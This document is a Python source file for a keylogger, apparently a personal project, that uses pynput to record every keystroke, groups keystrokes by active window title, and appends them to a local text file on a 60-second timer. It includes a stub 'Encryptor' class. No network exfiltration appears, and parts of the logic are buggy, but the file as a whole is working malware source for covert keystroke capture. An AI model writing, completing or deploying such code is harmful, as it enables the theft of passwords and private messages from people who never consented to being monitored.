from pynput import keyboard
import datetime
import sys
from abc import ABC,abstractmethod
from threading import Timer
import pygetwindow


class KeyloggerService:
    def __init__(self):
        self.logs = {}
        self.listener = None

    def get_active_window(self):
        try:
            return pygetwindow.getActiveWindowTitle()
        except:
            return "Unknown"

    def on_press(self, key):
        if key == keyboard.Key.alt_l:
            print(self.logs)
        if key == keyboard.Key.space:
            key = " "
        if key == keyboard.Key.enter:
            key = "\n"
        else:
            try:
                key = key.char
            except AttributeError:
                key = f" {str(key).replace("Key.","")} "
        if self.get_active_window() not in self.logs:
            self.logs[self.get_active_window()] = key
        else:
            self.logs[self.get_active_window()] += key


    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False


    def stop_listener(self):
        if self.listener:
            self.listener.stop()
        sys.exit(0)


    def clear_logs(self):
        self.logs = {}
        return self.logs


class Writer(ABC):
    @abstractmethod
    def writer(self,data):
        pass

class FileWriter(Writer):
    def __init__(self):
        self.path = r"C:\Users\st\KeyloggerProject\appdata1.txt"



    def writer(self,data):
        with open(self.path, "a") as logfile:
            if isinstance(data, dict):
                for key in data:
                    logfile.write(f"--{key}--")
                    logfile.write("\n")
                    all_data = "".join(data[key])
                    logfile.write(all_data)
                    logfile.write("\n")
            else:
                logfile.write("\n")
                logfile.write(data)
                logfile.write("\n")

class Encryptor:
    @staticmethod
    def encrypt(data):
        return data

    @staticmethod
    def decrypt(data):
        pass


class KeyloggerManager:
    def __init__(self):
        self.keylogger_service = KeyloggerService()
        self.filewriter = FileWriter()
        self.encryption = Encryptor()
        self.start_time = None
        self.timer = None
        self.listener = None


    @staticmethod
    def get_time():
        dt = datetime.datetime.now()
        return dt.strftime('***** %d/%m/%Y %H:%M *****')

    def save_data(self):
        encrypt_data = self.encryption.encrypt(self.keylogger_service.logs)
        self.filewriter.writer(self.start_time)
        self.filewriter.writer(encrypt_data)
        self.keylogger_service.logs = self.keylogger_service.clear_logs()
        self.start_time = KeyloggerManager.get_time()



    def start_logging(self):
        self.start_time = KeyloggerManager.get_time()
        with keyboard.Listener(on_press=self.keylogger_service.on_press,on_release=self.keylogger_service.on_release) as self.listener:
            self.listener.join()
        self.timer = Timer(interval=60,function=self.save_data)
        self.timer.start()





# s = KeyloggerService()
# s.start_listener()
test = KeyloggerManager()
test.start_logging()









